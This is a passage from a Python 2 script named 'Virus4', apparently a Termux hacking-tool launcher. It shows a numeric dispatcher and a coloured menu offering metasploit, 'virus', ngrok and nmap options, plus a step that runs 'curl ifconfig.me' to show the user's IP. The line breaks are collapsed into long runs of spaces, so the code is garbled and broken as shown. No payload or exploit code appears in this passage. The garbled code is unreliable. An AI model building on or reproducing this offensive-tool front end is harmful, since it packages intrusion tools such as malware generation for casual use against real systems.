sem_5()                                   elif e in "5":                                sem_6()                                   elif e in "6":                                sem_7()                                   elif e in "7":                                sem_8()                                   elif e in "8":                                sem_9()                                   elif e in "9":                                sem_10()                                  elif e in "10":                               sem_11()                                  elif e in "11":                               sem_12()                                  elif e in "12":                               sem_13()                                  elif e in "13":                               sem_14()                                  elif e in "14":                               sem_15()                                  elif e in "15":                               sem_16()                                  elif e in "16":                               sem_17()                                  elif e in "17":                               sem_18()                                  elif e in "18":                               sem_19()                                  else :                                        print "error"                                                                        def Virus4():                                sem()                                       print '                     '+blue+'V' +green+ '  i' +reset+ '  r' +purple+ '  u' +cyan+ '  s' +yellow+ '  4' +green +' ^_^'        time.sleep( 0.05)                           time.sleep( 0.05)                           kk(h)                                       print green + "  +________________________________________________________+"            time.sleep(0.05)                            print '  |' + cyan + "  [1] metasploit  |" +  reset + "  [2]Download   |" + purple + "  [3] Account       | "                       time.sleep(0.05)                            print ""                                    time.sleep(0.05)                            print  green + "  |           --------------------------------             |  "         time.sleep(0.05)                            print '  |' + red + "  [4] virus       | " + green + " [5] ngrok     | " + blue + " [6]  nmap         |    "                        time.sleep(0.05)                            print''                                     time.sleep(0.05)                            print green + "  |           --------------------------------             |  "          time.sleep(0.05)                            print '  |' + green + "  [7] Games       | " + reset + " [8] Termux    | " + purple + " [9] WEBsite       |    "                    time.sleep(0.05)                            print''                                     time.sleep(0.05)                            print''                                     time.sleep(0.05)                            print  green + "  |           --------------------------------             |  "         time.sleep(0.05)                            print '  |' + red + "  [00] Exit       | " + green + " [90] help     |" + blue + " [99] update        |    "                        time.sleep(0.05)                            print''                                     time.sleep(0.05)                            print''                                     time.sleep(0.05)                            print  green + "  |           --------------------------------             |  "         gg(f)                                       gg(y)                                       time.sleep(0.05)                            print''                                     time.sleep(0.05)                                                                        time.sleep(0.05)                           #echo -e "$green"                            nem = raw_input(cyan+"  |---{" + yellow + " my ip " + cyan +"}---| " +cyan+'    ('+red+'y'+cyan+') or ('+red+'n'+cyan+') ')         if nem == 'y' or nem == '(y)' or nem == 'Y' or nem == '(Y)' :                            os.system('curl ifconfig.me')               print blue                                  os.system('ifconfig wlan0 | grep -o 192..........')                                    else :                                        print cyan+'     was canceled'            #echo -e "$green "                          time.sleep(0.05)                            print''                                     time.sleep(0.05)                            enter =raw_input( cyan + " { 5.0.0 } Virus4 > ")                                        if enter == "1" or enter == "metasploit" or enter == "01":                               metasploitf()                              elif enter == "2" or enter == "Download" or enter == "02":                               download()                                 elif enter == "3" or enter == 'Account' or enter == "03":                                account()                                  elif enter == "4" or enter == 'virus' or enter == "04":                                  virus()                                    elif enter == "5" or enter == 'ngrok' or enter == "05":                                  Ngrok()                                    elif enter == "6" or enter == 'nmap' or enter == "06":                                   Nmap()                                     elif enter == "7" or enter == 'Games' or enter == "07":                                  games()                                    elif enter == "8" or enter == 'Termux' or enter == "08":                                 termux()                                   elif enter == "9" or enter == 'WEBsite' or enter == "09":                                website()                                  elif enter == "90" or enter == 'help':       help()                                     elif enter == "99"or enter == 'update':      up_date()                                  elif enter == "00" or enter == 'exit' or enter == "0" or enter == "quit":                exit()                                     elif enter == "20" or enter == 'youtube':    my_youtube()                               elif enter == "30" or enter == "facebook":   my_facebook()                              else:                                        error()                                     Virus4()                                  moni()                                      Virus4()                                  Virus4()
